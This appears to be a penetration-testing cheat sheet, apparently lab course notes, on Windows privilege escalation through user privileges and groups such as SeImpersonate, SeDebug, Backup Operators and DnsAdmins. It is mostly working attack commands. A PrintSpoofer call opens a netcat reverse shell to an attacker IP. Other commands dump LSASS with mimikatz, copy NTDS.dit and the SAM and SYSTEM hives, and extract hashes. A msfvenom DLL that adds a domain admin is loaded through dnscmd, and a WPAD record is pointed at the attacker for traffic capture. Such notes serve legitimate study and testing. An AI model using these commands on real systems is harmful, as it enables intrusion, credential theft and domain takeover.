
# Windows User Privileges
- [list of User Rights and Privileges](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory#table-b-1-user-rights-and-privileges)
## SeImpersonate and SeAssignPrimaryToken

- Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used and gain NT AUTHORITY\SYSTEM level access.
- We will often run into this privilege after gaining remote code execution via an application that runs in the context of a service account (for example, uploading a web shell to an ASP.NET web application, achieving remote code execution through a Jenkins installation, or by executing commands through MSSQL queries).
- tools
  - [JuicyPotato](https://github.com/ohpe/juicy-potato). JuicyPotato doesn't work on `Windows Server 2019` and `Windows 10 build 1809 onwards`.
  - [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). work on Windows 10 and Server 2016/2019.
  - [RoguePotato](https://github.com/antonioCoco/RoguePotato). 

### check 
```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled    
```


### PrintSpoofer
```powershell
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

```

## SeDebugPrivilege
- To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group.
- it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.



### check
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Enabled
```

### Dump Memory
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe "log" "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit
```

### RCE
-  If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly
- [psgetsystem](https://github.com/decoder-it/psgetsystem)




```powershell
# get a listing of running processes and accompanying PIDs.
tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K

# we can target winlogon.exe running under PID 612, which we know runs as SYSTEM on Windows hosts.
Import-Module .\psgetsys.ps1 

ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```

## SeTakeOwnershipPrivilege
- SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.
- This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor.

### check 
```powershell

whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
```

### Take onwership 

```powershell
# check ownership of a file
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
cmd /c dir /q 'C:\Department Shares\Private\IT'

# check owenrship of a user in AD
$user = Get-ADUser -Identity "username" -Properties * # Replace 'username' with the actual username
$objectGUID = $user.ObjectGUID
$ADsPath = "LDAP://<GUID=$objectGUID>"
$userObject = [ADSI]$ADsPath
$owner = $userObject.psbase.ObjectSecurity.GetOwner([System.Security.Principal.NTAccount])
Write-Output "Owner: $owner"



# Taking Ownership of the File
takeown /f 'C:\Department Shares\Private\IT\cred.txt'

# Modifying the File ACL
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

# Reading the File
cat 'C:\Department Shares\Private\IT\cred.txt'

```

### Files of Interest
```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

# Windows Group Privileges
- [listing of all built-in Windows groups](https://ss64.com/nt/syntax-security_groups.html)

## Backup Operators
-  Membership of this group grants its members the `SeBackup` and `SeRestore` privileges.
-  The `SeBackupPrivilege` allows us to traverse any folder and list the folder contents. 
- Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.
- This group also permits logging in locally to a domain controller. this can be used to copy `NTDS.dit`
- [poc SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)


### check
```powershell
whoami /priv
whoami /groups

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# check if SeBackup is enabled of disabled
Get-SeBackupPrivilege

# enable SeBackup
Set-SeBackupPrivilege
```

### Copying a Protected File
```powershell
# from `SeBackupPrivilegeCmdLets.dll`
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

# using robocopy
robocopy /B 'C:\Confidential\' .\ '2021 Contract.txt'
```

### Attacking a Domain Controller - Copying NTDS.dit
- log in DC
- DiskShadow binary needs to executed from the C:\Windows\System32
```powershell
# beckup the NTDS.dit from DC
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

dir E:


# copy NTDS.dit file to read it
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

# copy NTDS.dit file to read it using robocopy
robocopy /B E:\Windows\NTDS .\Tools ntds.dit
```

### Backing up SAM , Security and SYSTEM Registry Hives
- The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline
```powershell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

### Extracting Credentials
**Linux**
```powershell
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
**Windows** 
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

## Event Log Readers
- members of the Event Log Readers group have permission to access system logs.
- can be used to read logs may contain passwords or hashes

### read logs
```powershell
# check joining to the group
net localgroup "Event Log Readers"

# Searching Security Logs Using wevtutil
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# use as another user
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"


# Searching Security Logs Using Get-WinEvent
# Note: Searching the Security event log with Get-WInEvent requires administrator access or permissions adjusted on the registry key HKLM\System\CurrentControlSet\Services\Eventlog\Security.
# Membership in just the Event Log Readers group is not sufficient.
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

## DnsAdmins
- Members of the DnsAdmins group have access to DNS information on the network.
- The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones.
- DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.
-  Membership in this group gives us the rights to disable global query block security which can be used in Creating a WPAD (Web Proxy Automatic Discovery Protocol) Record 

### check
```powershell
Get-ADGroupMember -Identity DnsAdmins
```

### RCE
- DNS management is performed over RPC
- ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
- When a member of the DnsAdmins group runs the dnscmd command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL in context of `system/nt` in DC to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

```powershell
# 1) Generating Malicious DLL , from linux 
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# 2) send dll to windows victim

# 3) Loading Custom DLL
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# 4) Checking Permissions on DNS Service
wmic useraccount where name="<username>" get sid

# RPWP permissions which translate to SERVICE_START and SERVICE_STOP, respectively.
sc.exe sdshow DNS
(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)

# 5) Restarting the DNS Service
sc.exe stop dns
sc.exe start dns

# 6) Confirming Registry Key Added and cleaning
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

### Disabling the Global Query Block List
- After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine.
- We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.
```powershell
# Disabling the Global Query Block List
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

# Adding a WPAD Record
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
